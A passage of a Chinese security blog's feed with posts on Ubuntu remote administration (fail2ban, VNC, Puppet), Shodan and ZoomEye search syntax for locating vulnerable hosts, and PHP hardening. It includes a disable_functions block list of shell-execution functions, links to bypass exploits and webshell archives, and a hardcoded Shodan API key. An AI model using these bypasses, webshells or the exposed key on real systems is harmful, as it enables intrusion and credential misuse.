class="comment">#2.Actions: 有异常做什么动作(比如报警邮件，默认是防火墙屏蔽)</span></span><br><span class="line"><span class="comment">#3.Jails设置：针对不同类型的服务(并不仅限于ssh服务)，配置不同的（这里的优先级比全局配置项高）</span></span><br><span class="line">[sshd]</span><br><span class="line">ecabled=<span class="literal">true</span> <span class="comment"># 启用对ssh的jails</span></span><br><span class="line">filter=sshd  <span class="comment"># 查找的关键词</span></span><br><span class="line">logpath = xxxxxx.log</span><br><span class="line"><span class="comment"># 以ssh服务为例(见下图)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务生效 </span></span><br><span class="line">sudo systemctl restart fail2ban.service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看身份认证日志文件</span></span><br><span class="line">tail -f /var/<span class="built_in">log</span>/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看jail列表(都有哪些jail，jail的情况)</span></span><br><span class="line">sudo fail2ban -client status</span><br><span class="line">sudo fail2ban -client status sshd <span class="comment"># 查看ssh的jail的详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看防火墙规则</span></span><br><span class="line">sudo iptables -S</span><br><span class="line">sudo iptables -L -n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动解除被禁IP</span></span><br><span class="line">sudo iptables -D f2b-sshd<span class="_">-s</span> 192.168.1.111 -j REJECT   <span class="comment"># 通过删除防火墙某一个规则 -D,  REJECT或DROP看自己的情况</span></span><br><span class="line">sudo fail2ban-client <span class="built_in">set</span> sshd unbanip 192.168.1.8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动解除禁用之后，但是如果重启服务，会再自动查看日志：还没有超过被禁期限的ip会再次被禁</span></span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-远程管理/20200330164545399_6809.png" alt></p><h2 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a><font color="red">VNC服务</font></h2><blockquote><p>这里只介绍vnc，还有其他更优秀的工具，但是vnc的适用范围最广</p></blockquote><p>图形化界面（类似于windows下的远程桌面）</p><ul><li>使用图形化界面及工具</li><li>是Linux系统最通用的远程图形管理工具（通用适用于windows）</li></ul><p>安装图形环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里安装简化版的xfce4桌面环境，这里选择vnc的一个软件包:tightvncserver. 也可以自己选择别的版本的</span></span><br><span class="line">sudo apt install gnome-core xfce4 xfce4-goodies tightvncserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个vnc可以启动多个侦听端口(默认从5901开始)，从不同端口连接，打开不同会话(每个用户看到的桌面是不一样的)</span></span><br><span class="line"><span class="comment"># 若只侦听一个端口，通过一个端口连接，多个用户看到的都是一个桌面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建议：多用户，在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了</span></span><br></pre></td></tr></table></figure></p><p>运行配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vncserver  <span class="comment"># 启动vnc服务（接下来会让你输入连接密码和只读密码）</span></span><br><span class="line">~/.vnc/xstartup   <span class="comment"># 会生成运行文件</span></span><br><span class="line">vncserver -<span class="built_in">kill</span>:1 <span class="comment"># 删掉自动生成的实例（因为不一定最适合我们的桌面环境。冒号后面是1是5901,如果是2就是5902）</span></span><br><span class="line"><span class="comment"># 备份一下文件</span></span><br><span class="line">mv xstartup xstartup.bak</span><br><span class="line"><span class="comment"># 创建新运行文件， 手动配置适合我们xfce4的vnc配置</span></span><br><span class="line">vim xstartup</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">xrdb <span class="variable">$HOME</span>/.Xresources</span><br><span class="line">startxfce4 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod +x ~/.vnc/xstartup</span><br><span class="line"><span class="comment"># 重新运行</span></span><br><span class="line">vncserver   <span class="comment"># tcp的5901端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 就可以在客户端用客户端软件连接了(比如：Remote Desktop Viewer) 输入ip:端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> 服务器上，能少开端口就少开端口，能少开服务就少开服务</span></span><br></pre></td></tr></table></figure></p><p>多用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个用户不用会话</span></span><br><span class="line"><span class="comment"># 在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了</span></span><br><span class="line">su newuser1</span><br><span class="line">vncserver</span><br><span class="line">~/.vnc/xstartup  </span><br><span class="line">vncserver -<span class="built_in">kill</span>:2</span><br><span class="line">vim xstartup</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">xrdb <span class="variable">$HOME</span>/.Xresources</span><br><span class="line">startxfce4 &amp;</span><br><span class="line"></span><br><span class="line">chmod +x ~/.vnc/xstartup</span><br><span class="line">vncserver :2   <span class="comment"># tcp的5902端口</span></span><br></pre></td></tr></table></figure></p><blockquote><p>ps: vnc的加密强度不是很高，所以：在不需要vnc的时候，建议杀掉vnc进程(<code>vncserver -kill:2</code>)</p></blockquote><p>因为 vnc的加密强度没有ssh高，所以，尝试：先建立ssh隧道，再在隧道的基础上建立图形化的连接</p><h2 id="PUPPET"><a href="#PUPPET" class="headerlink" title="PUPPET"></a><font color="red">PUPPET</font></h2><p>也是一个远程管理工具，可以不登录到被管理服务器上<br>利用puppet的服务端(我的机器)来管理puppet的客户端(安装在远程服务器上)，进行批量管理…  </p><p>全生命周期的远程管理方案  </p><ul><li>软件安装部署(可以写一个脚本，然后批量下发给安装有puppet客户端的服务器上)</li><li>权限设置</li><li>账号管理</li><li>支持云平台</li><li>支持容器(Docker)</li><li>适合大量服务器管理</li></ul><p><strong>准备</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里以两台机器做实验</span></span><br><span class="line"><span class="comment"># 为了区分，改一下两台计算机名</span></span><br><span class="line">hostnamectrl <span class="built_in">set</span>-hostname puppet</span><br><span class="line">hostnamectrl <span class="built_in">set</span>-hostname client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改hosts文件，修改解析域名(这个随便起) -- 两台机器都要修改</span></span><br><span class="line">vim /etv/hosts</span><br><span class="line">192.168.1.10puppet.lab.compuppet</span><br><span class="line">192.168.1.11client.lab.comclient</span><br><span class="line"><span class="comment"># 其他行都删掉就行</span></span><br><span class="line"><span class="comment"># 可以在dns服务器上修改，这里通过hosts修改域名解析只是权宜之计(下一章学完DNS之后就在dns服务器修改域名的解析)</span></span><br></pre></td></tr></table></figure></p><p><strong>安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装puppet服务端程序</span></span><br><span class="line">sudo apt install puppetmaster </span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装puppet客户端程序</span></span><br><span class="line">sudo apt install puppet</span><br></pre></td></tr></table></figure></p><p><strong>配置</strong><br>服务端配置-1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/puppet</span><br><span class="line">sudo mkdir -p modules/apache2/manifests  <span class="comment"># manifests 目录下面就是资源文件</span></span><br><span class="line">touch init.pp</span><br><span class="line"><span class="comment"># sudo vim /etc/puppet/modules/apache2/manifests/init.pp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比如要给下面的机器安装apache, </span></span><br><span class="line"><span class="comment"># 一组资源就是一个类</span></span><br><span class="line">class apache2&#123;</span><br><span class="line">package&#123;<span class="string">'apache2'</span>:   <span class="comment"># 软件包</span></span><br><span class="line">ensure=&gt;installeds,</span><br><span class="line">&#125;</span><br><span class="line">service&#123;<span class="string">'apache2'</span>:   <span class="comment"># apache的服务是否启动</span></span><br><span class="line">ensure=&gt;ture,</span><br><span class="line">ensure=&gt;ture,</span><br><span class="line">require=&gt;Package[<span class="string">'apache2'</span>],  <span class="comment"># 包的名称</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务端配置-2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上面的配置文件定义了资源，那么这里确定要给哪些服务器安装哪个资源</span></span><br><span class="line"><span class="comment"># 选择哪个资源</span></span><br><span class="line"><span class="built_in">cd</span> manifests</span><br><span class="line">touch site.pp</span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /etc/puppet/manifests/site.pp</span></span><br><span class="line"><span class="comment"># 解析这个节点(通过域名解析到对应ip,只要那些计算机在这个域名即可)</span></span><br><span class="line">node <span class="string">'client.lab.com'</span> &#123;</span><br><span class="line">include apache2   <span class="comment"># 选择下发哪些资源。这里以推送apache2资源为例</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">systemctl restart puppetmaster.service</span><br></pre></td></tr></table></figure></p><p>客户端配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># puppet的客户端和服务端是通过证书来通信等操作的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /etc/default/puppet          默认没有，自己新建</span></span><br><span class="line">START=yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务（会自动向puppet服务端发起请求申请证书）</span></span><br><span class="line">systemctl restart puppet.service</span><br></pre></td></tr></table></figure></p><p>客户端证书前面请求测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在查看客户端的指纹信息</span></span><br><span class="line">sudo puppet agent --figerprint</span><br><span class="line"><span class="comment"># 服务端下面下发证书后，然后在客户端测试一下，获取证书</span></span><br><span class="line">sudo puppet agent --<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p>服务端请求查看签名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在服务端查看哪些客户端跟我发起证书请求了</span></span><br><span class="line">sudo puppet cert list</span><br><span class="line"><span class="comment"># 在服务端使用自己的私钥给对应的机器进行签名(sign)</span></span><br><span class="line">sudo puppet cert sign client.lab.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端查看证书下发进度： sudo puppet agent --test</span></span><br></pre></td></tr></table></figure></p><p>完成上面的步骤(资源的下发配置，证书的请求与签名下发，重启服务)之后，在客户端查看<code>apache2</code>的服务已经安装好并启用了</p><p>日志状态信息查看<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status puppet.service</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure></p><p>上面关于puppet只是简单的一小部分，后续高级用法，请自行探索</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第七章-远程管理&quot;&gt;&lt;a href=&quot;#第七章-远程管理&quot; class=&quot;headerlink&quot; title=&quot;第七章-远程管理&quot;&gt;&lt;/a&gt;第七章-远程管理&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;看我遥控你&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;远
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="Ubuntu" scheme="http://www.xpshuai.cn/tags/Ubuntu/"/>
    
      <category term="远程管理" scheme="http://www.xpshuai.cn/tags/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>黑暗引擎</title>
    <link href="http://www.xpshuai.cn/%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E/"/>
    <id>http://www.xpshuai.cn/黑暗引擎/</id>
    <published>2020-03-29T05:22:23.000Z</published>
    <updated>2020-04-29T13:47:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-shodan"><a href="#一-shodan" class="headerlink" title="一. shodan"></a>一. shodan</h4><h6 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1.简单介绍"></a>1.简单介绍</h6><p>Shodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。</p><h6 id="2-内置语法"><a href="#2-内置语法" class="headerlink" title="2.内置语法"></a>2.内置语法</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Shodan的参数有很多，这里只介绍简单的几种</span></span><br><span class="line">hostname：<span class="string">"主机或域名"</span></span><br><span class="line">如 hostname:<span class="string">"google''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">port："</span>端口或服务<span class="string">"</span></span><br><span class="line"><span class="string">如 port:"</span>21<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ip : "</span>ip地址<span class="string">"</span></span><br><span class="line"><span class="string">如 ip : "</span>168.205.71.64<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">net："</span>IP地址或子网<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 net:"</span>210.45.240.0/24<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">vuln :指定漏洞的cve</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 vuln:CVE-2015-8869</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">os :"</span>操作系统<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​ 如 os:"</span>centOS<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">isp："</span>ISP供应商<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 isp:"</span>China Telecom<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">product："</span>操作系统/软件/平台<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 product:"</span>Apache httpd<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">version："</span>软件版本<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 version:"</span>3.1.6<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">geo："</span>经纬度<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 geo:"</span>39.8779,116.4550<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">country`："</span>国家<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 country:"</span>China<span class="string">"</span></span><br><span class="line"><span class="string">country:"</span>UN<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">city："</span>城市<span class="string">"</span></span><br><span class="line"><span class="string">如 city:"</span>Hefei<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">org："</span>组织或公司<span class="string">"</span></span><br><span class="line"><span class="string">如 org:"</span>google<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">before/after："</span>日/月/年<span class="string">"</span></span><br><span class="line"><span class="string">如 before:"</span>25/09/2017<span class="string">"</span></span><br><span class="line"><span class="string">after:"</span>25/09/2017<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">asn : "</span>自治系统号码<span class="string">"</span></span><br><span class="line"><span class="string">如 asn:"</span>AS2233<span class="string">"</span></span><br></pre></td></tr></table></figure><h6 id="3-脚本使用-（建议使用本地脚本，也可自主开发）"><a href="#3-脚本使用-（建议使用本地脚本，也可自主开发）" class="headerlink" title="3.脚本使用  （建议使用本地脚本，也可自主开发）"></a>3.脚本使用  （建议使用本地脚本，也可自主开发）</h6><pre><code>项目地址：https://github.com/achillean/shodan-python</code></pre><p>先clone, python setup.py install, shodan init 秘钥_value,然后可以在命令行用了就<br><code>shodan search product:&quot;apache&quot;</code>  只不过显示方式不友好</p><p>拓展：自主开发</p><pre><code>官方文档：https://shodan.readthedocs.io/en/latest/index.html</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> shodan <span class="keyword">import</span> Shodan</span><br><span class="line"></span><br><span class="line">api = Shodan(<span class="string">"cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lookup an IP</span></span><br><span class="line">ipinfo = api.host(<span class="string">'8.8.8.8'</span>)</span><br><span class="line">print(ipinfo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Search for websites that have been "hacked"</span></span><br><span class="line"><span class="keyword">for</span> banner <span class="keyword">in</span> api.search_cursor(<span class="string">'ch1_http相关.title:"hacked by"'</span>):</span><br><span class="line">    print(banner)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the total number of industrial control systems services on the Internet</span></span><br><span class="line">ics_services = api.count(<span class="string">'tag:ics'</span>)</span><br><span class="line">print(<span class="string">'Industrial Control Systems: &#123;&#125;'</span>.format(ics_services[<span class="string">'total'</span>]))</span><br></pre></td></tr></table></figure><h6 id="案例测试："><a href="#案例测试：" class="headerlink" title="案例测试："></a>案例测试：</h6><p>1.phpstudy采集<br>头部信息 <code>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9</code></p><p>2.子域名信息采集<br><code>hostname:&quot;xps.cn&quot;</code></p><p>3.特定漏洞靶机采集<br><code>vuln:CVE-2020-1983</code> 普通用户没权限用</p><h4 id="二-zoomeye"><a href="#二-zoomeye" class="headerlink" title="二. zoomeye"></a>二. zoomeye</h4><blockquote><p>对国内更贴近一些</p></blockquote><h6 id="内置语法"><a href="#内置语法" class="headerlink" title="内置语法"></a>内置语法</h6><pre><code>ZoomEye搜索技巧指定搜索的组件以及版本app：组件名称ver：组件版本例如：搜索 apache组件    版本2.4app:apache ver:2.4指定搜索的端口port:端口号例如：搜索开放了SSH端口的主机port:22一些服务器可能监听了非标准的端口。要按照更精确的协议进行检索，可以使用service进行过滤。指定搜索的操作系统OS:操作系统名称例如：搜索Linux操作系统OS：Linux指定搜索的服务service：服务名称例如，搜素SSH服务Service：SSH指定搜索的地理位置范country：国家city：城市名例如：country:Chinacity：Beijing搜索指定的CIDR网段CIDR:网段区域例如：CIDR：192.168.158.12/24搜索指定的网站域名Site:网站域名例如：site:www.baidu.com搜索指定的主机名Hostname:主机名例如：hostname:zwl.cuit.edu.cn搜索指定的设备名Device：设备名例如：device:router搜索具有特定首页关键词的主机Keyword：关键词例如：keyword:technology</code></pre><h6 id="脚本开发-多语言开发"><a href="#脚本开发-多语言开发" class="headerlink" title="脚本开发(多语言开发)"></a>脚本开发(多语言开发)</h6><pre><code>官方手册:https://www.zoomeye.org/doc</code></pre><p>1.登录授权<br>2.请求搜索<br>3.回显数据</p><h4 id="补充：谷歌黑客高级玩法"><a href="#补充：谷歌黑客高级玩法" class="headerlink" title="补充：谷歌黑客高级玩法"></a>补充：谷歌黑客高级玩法</h4><pre><code>https://www.uedbox.com/shdb/https://www.uedbox.com/post/54776/</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;一-shodan&quot;&gt;&lt;a href=&quot;#一-shodan&quot; class=&quot;headerlink&quot; title=&quot;一. shodan&quot;&gt;&lt;/a&gt;一. shodan&lt;/h4&gt;&lt;h6 id=&quot;1-简单介绍&quot;&gt;&lt;a href=&quot;#1-简单介绍&quot; class=&quot;header
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="黑暗引擎" scheme="http://www.xpshuai.cn/tags/%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>PHP常见安全设置</title>
    <link href="http://www.xpshuai.cn/PHP%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"/>
    <id>http://www.xpshuai.cn/PHP常见安全设置/</id>
    <published>2020-03-29T05:20:58.000Z</published>
    <updated>2020-04-29T13:47:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-INI与WEB安全"><a href="#PHP-INI与WEB安全" class="headerlink" title="PHP.INI与WEB安全"></a>PHP.INI与WEB安全</h2><h3 id="四种防护"><a href="#四种防护" class="headerlink" title="四种防护"></a>四种防护</h3><h4 id="1-magic-quotes-gpc"><a href="#1-magic-quotes-gpc" class="headerlink" title="1.magic_quotes_gpc"></a>1.magic_quotes_gpc</h4><p>魔术引号：<code>过滤转义</code>四种字符（），对于sql注入有过滤作用</p><p><strong>绕过：</strong> 特定条件下可以尝试<code>宽字节注入</code>     </p><h4 id="2-safe-mod"><a href="#2-safe-mod" class="headerlink" title="2.safe_mod"></a>2.safe_mod</h4><blockquote><p>安全模式，官方自带的</p></blockquote><p><strong>安全模式：</strong>  禁止php中敏感函数，防御提权及后门调用，漏洞利用<br>一些敏感函数被禁用</p><p>有时候不开安全模式的原因：自己开发中也需要使用到某些敏感函数，不然影响正常应用</p><h4 id="3-open-basedir"><a href="#3-open-basedir" class="headerlink" title="3.open_basedir"></a>3.open_basedir</h4><p>启用之后： open_basedir=D:\phpstudy\PHPTutorial\WWW`<br>限制后门的访问指定目录（菜刀连上也看不到目录里面）</p><blockquote><p>没办法绕过</p></blockquote><h4 id="4-disable-function"><a href="#4-disable-function" class="headerlink" title="4.disable_function"></a>4.disable_function</h4><p>可<code>自定义禁用函数</code>：安全模式(safe_mod)升级版，可自定义函数禁用，更加灵活</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_function = <span class="keyword">eval</span>,system,fopen,fread,readdir,init_set    <span class="comment">//比如禁用某指定函数的做法</span></span><br><span class="line"><span class="comment">// 可以直接封杀大马小马等后门disable_functiondisable_function</span></span><br></pre></td></tr></table></figure><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>disable_function的突破:</p><h6 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a><strong>方法1：</strong></h6><p>蚁剑及插件(绕过disable_function)使用, 加载插件<br>插件会保存到antData/plugin目录<br>现在好像已经不用自己下载这个插件了</p><blockquote><p>参考文章:  <a href="https://www.cnblogs.com/linuxsec/articles/10966675.html" target="_blank" rel="noopener">https://www.cnblogs.com/linuxsec/articles/10966675.html</a></p></blockquote><h6 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a><strong>方法2：</strong></h6><p> 针对php7.x:（不支持windows）<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><h6 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a><strong>方法3：</strong></h6><p> 脚本集合：<br><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a><br><a href="http://webshell8.com/down/phpwebshell.zip" target="_blank" rel="noopener">http://webshell8.com/down/phpwebshell.zip</a></p><h6 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a><strong>方法4：</strong></h6><p>一些webshell自带绕过功能</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>目录权限<br>文件解析</p><p>… …</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP-INI与WEB安全&quot;&gt;&lt;a href=&quot;#PHP-INI与WEB安全&quot; class=&quot;headerlink&quot; title=&quot;PHP.INI与WEB安全&quot;&gt;&lt;/a&gt;PHP.INI与WEB安全&lt;/h2&gt;&lt;h3 id=&quot;四种防护&quot;&gt;&lt;a href=&quot;#四种防护&quot;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="php.ini" scheme="http://www.xpshuai.cn/tags/php-ini/"/>
    
  </entry>
  
  <entry>
    <title>xray简单学习</title>
    <link href="http://www.xpshuai.cn/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.xpshuai.cn/xray简单学习/</id>
    <published>2020-03-29T05:12:01.000Z</published>
    <updated>2020-04-29T13:47:00.000Z</updated>
    
